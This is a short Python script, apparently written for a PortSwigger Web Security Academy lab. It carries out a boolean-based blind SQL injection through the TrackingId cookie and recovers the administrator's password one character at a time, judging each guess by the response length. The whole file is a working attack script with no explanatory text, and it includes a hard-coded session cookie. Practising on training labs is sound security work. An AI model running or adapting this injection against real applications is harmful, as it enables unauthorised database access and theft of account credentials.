#!/usr/bin/env python3

import requests

count = 0
position = 1
result =[]
while True:
	for character in "u0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ":
		url = "https://ac2f1fa31fe787ffc0b317780009003d.web-security-academy.net"
		headers = {"Host":"ac2f1fa31fe787ffc0b317780009003d.web-security-academy.net"}
		cookies = {"TrackingId":f"8syML4lIXgMYEtY5' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), {position}, 1) = '{character}", "session":"TdEH0u2LJKCEDMRnwZWd43oFiz03eqkP"}
		r = requests.get(url, cookies=cookies)
		if len(r.text) == 11041:
			print(f"character used: {character}")
			print(f"position: {position}")
			print(len(r.text))
			result.append(character)
			print("result: "+"".join(result)+"...")
			position += 1
			break
	count += 1
	if int(position) < int(count):
		print("FINAL RESULT: "+"".join(result))
		break